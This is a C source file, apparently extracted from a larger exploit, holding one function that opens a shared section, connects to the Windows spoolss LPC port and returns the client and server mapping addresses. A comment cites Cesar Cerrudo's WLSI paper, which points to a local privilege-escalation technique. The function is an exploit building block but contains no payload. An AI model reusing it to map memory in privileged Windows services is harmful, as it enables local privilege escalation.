#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_14__   TYPE_6__ ;
typedef  struct TYPE_13__   TYPE_3__ ;
typedef  struct TYPE_12__   TYPE_2__ ;
typedef  struct TYPE_11__   TYPE_1__ ;

/* Type definitions */
typedef  int /*<<< orphan*/  sectionInfo ;
typedef  int /*<<< orphan*/  mapInfo ;
typedef  int byte ;
typedef  char WCHAR ;
struct TYPE_11__ {int Length; int MaximumLength; char* Buffer; } ;
typedef  TYPE_1__ UNICODE_STRING ;
struct TYPE_14__ {int Length; int ServerBaseAddress; int /*<<< orphan*/  ClientBaseAddress; int /*<<< orphan*/  SectionSize; int /*<<< orphan*/  SectionHandle; } ;
struct TYPE_13__ {int HighPart; int /*<<< orphan*/  LowPart; scalar_t__ QuadPart; } ;
struct TYPE_12__ {int Length; int ContextTrackingMode; int EffectiveOnly; int /*<<< orphan*/  ImpersonationLevel; } ;
typedef  TYPE_2__ SECURITY_QUALITY_OF_SERVICE ;
typedef  int /*<<< orphan*/  (* NTCREATESECTION ) (int /*<<< orphan*/ *,int /*<<< orphan*/ ,int /*<<< orphan*/ *,TYPE_3__*,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ *) ;
typedef  int /*<<< orphan*/  (* NTCONNECTPORT ) (int /*<<< orphan*/ *,TYPE_1__*,TYPE_2__*,int*,int*,int*,int*,int*) ;
typedef  TYPE_6__ LPCSECTIONMAPINFO ;
typedef  TYPE_6__ LPCSECTIONINFO ;
typedef  TYPE_3__ LARGE_INTEGER ;
typedef  int /*<<< orphan*/  HANDLE ;
typedef  int DWORD ;
typedef  int /*<<< orphan*/  ConnectDataBuffer ;

/* Variables and functions */
 int /*<<< orphan*/  GetModuleHandle (char*) ; 
 scalar_t__ GetProcAddress (int /*<<< orphan*/ ,char*) ; 
 int /*<<< orphan*/  PAGE_READWRITE ; 
 int /*<<< orphan*/  REQUIRED_SIZE ; 
 int /*<<< orphan*/  SECTION_ALL_ACCESS ; 
 int /*<<< orphan*/  SEC_COMMIT ; 
 int /*<<< orphan*/  SHARED_SECTION_SIZE ; 
 int /*<<< orphan*/  SecurityIdentification ; 
 int /*<<< orphan*/  memset (TYPE_6__*,int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  printf (char*) ; 
 int wcslen (char*) ; 

LARGE_INTEGER ConnectToLPCPort(void){
   /* Thanks goes to Cesar Cerrudo for the WLSI paper */
	HANDLE hPort;
	LPCSECTIONINFO sectionInfo;
	LPCSECTIONMAPINFO mapInfo;
	byte ConnectDataBuffer[100];
	DWORD Size = sizeof(ConnectDataBuffer);
   WCHAR  * uString=L"\\RPC Control\\spoolss";
	DWORD i;
	UNICODE_STRING uStr;
   LARGE_INTEGER ret;
   

   NTCONNECTPORT NtConnectPort;
   NTCREATESECTION NtCreateSection;

   ret.QuadPart=0;
	for (i=0;i<100;i++)
		ConnectDataBuffer[i]=0x0;


   NtConnectPort= (NTCONNECTPORT)GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtConnectPort");
   NtCreateSection= (NTCREATESECTION)GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtCreateSection");

   if ( (!NtConnectPort) || (!NtCreateSection) ) {
      printf("[-] Error Loading functions\n");
   } else {
   	HANDLE hSection;
	   LARGE_INTEGER SecSize;
	   DWORD maxSize=0;
	   SECURITY_QUALITY_OF_SERVICE qos;
      DWORD qosSize=4;

      //create shared section	
      SecSize.LowPart=REQUIRED_SIZE;//0x1000;
	   SecSize.HighPart=0x0;

	   qos.Length =(DWORD)&qosSize;
	   qos.ImpersonationLevel =SecurityIdentification;
	   qos.ContextTrackingMode =0x01000101;
	   qos.EffectiveOnly =0x10000;
	   
	   NtCreateSection(&hSection,SECTION_ALL_ACCESS,NULL,&SecSize,PAGE_READWRITE,SEC_COMMIT ,NULL);
      
      //connect to lpc
	   memset(&sectionInfo, 0, sizeof(sectionInfo));
	   memset(&mapInfo, 0, sizeof(mapInfo));

	   sectionInfo.Length = 0x18;
	   sectionInfo.SectionHandle =hSection;
	   sectionInfo.SectionSize = SHARED_SECTION_SIZE;
	   mapInfo.Length = 0x0C;

	   uStr.Length = wcslen(uString)*2;
	   uStr.MaximumLength = wcslen(uString)*2+2;
	   uStr.Buffer =uString;
	
	   //connect to LPC port
	   if (!NtConnectPort(&hPort,&uStr,&qos,(DWORD *)&sectionInfo,(DWORD *)&mapInfo,&maxSize,(DWORD*)ConnectDataBuffer,&Size)){
         ret.LowPart=sectionInfo.ClientBaseAddress ; 
         ret.HighPart=sectionInfo.ServerBaseAddress;
      } 


   }
	return(ret);
}